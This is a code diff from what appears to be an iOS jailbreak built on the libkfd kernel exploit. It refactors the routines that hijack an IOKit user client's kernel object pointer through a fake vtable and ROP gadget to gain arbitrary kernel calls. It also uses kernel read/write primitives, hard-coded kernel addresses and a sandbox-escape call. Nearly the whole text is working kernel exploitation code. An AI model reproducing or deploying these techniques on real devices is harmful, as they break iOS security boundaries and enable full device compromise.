@@ -10,6 +10,7 @@
 #import "libkfd.h"
 #import "offsets.h"
 #import "sandbox.h"
+#import "ipc.h"
 
 uint64_t _kfd = 0;
 
@@ -152,7 +153,8 @@ void kwritebuf(uint64_t kaddr, void* input, size_t size)
 }
 
 uint64_t zm_fix_addr_kalloc(uint64_t addr) {
-    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8; guess what is that address xD
+    //se2 15.0.2 = 0xFFFFFFF00782E718, 6s 15.1 = 0xFFFFFFF0071024B8;
+    //XXX guess what is that address xD
     uint64_t kmem = 0xFFFFFFF0071024B8 + get_kslide();
     uint64_t zm_alloc = kread64(kmem);    //idk?
     uint64_t zm_stripped = zm_alloc & 0xffffffff00000000;
@@ -176,7 +178,7 @@ uint64_t init_kcall(void) {
       exit(EXIT_FAILURE);
     }
     uint64_t uc_port = port_name_to_ipc_port(_user_client);
-    uint64_t uc_addr = kread64(uc_port + 0x58);    //#define IPC_PORT_IP_KOBJECT_OFF
+    uint64_t uc_addr = kread64(uc_port + off_ipc_port_ip_kobject);    //#define IPC_PORT_IP_KOBJECT_OFF
     uint64_t uc_vtab = kread64(uc_addr);
     
     if(_fake_vtable == 0) _fake_vtable = off_empty_kdata_page + get_kslide();
@@ -191,7 +193,7 @@ uint64_t init_kcall(void) {
         kwrite64(_fake_client+i*8, kread64(uc_addr+i*8));
     }
     kwrite64(_fake_client, _fake_vtable);
-    kwrite64(uc_port + 0x58, _fake_client);    //#define IPC_PORT_IP_KOBJECT_OFF
+    kwrite64(uc_port + off_ipc_port_ip_kobject, _fake_client);
     kwrite64(_fake_vtable+8*0xB8, add_x0_x0_0x40_ret_func);
 
     return 0;
@@ -250,9 +252,9 @@ int prepare_kcall(void) {
     NSString* save_path = @"/tmp/kfd-arm64.plist";
     if(access(save_path.UTF8String, F_OK) == 0) {
         uint64_t sb = unsandbox(getpid());
-        NSDictionary *kcalltest14_dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
-        _fake_vtable = [kcalltest14_dict[@"kcall_fake_vtable"] unsignedLongLongValue];
-        _fake_client = [kcalltest14_dict[@"kcall_fake_client"] unsignedLongLongValue];
+        NSDictionary *dict = [NSDictionary dictionaryWithContentsOfFile:save_path];
+        _fake_vtable = [dict[@"kcall_fake_vtable"] unsignedLongLongValue];
+        _fake_client = [dict[@"kcall_fake_client"] unsignedLongLongValue];
         sandbox(getpid(), sb);
     } else {
         kalloc_using_empty_kdata_page();
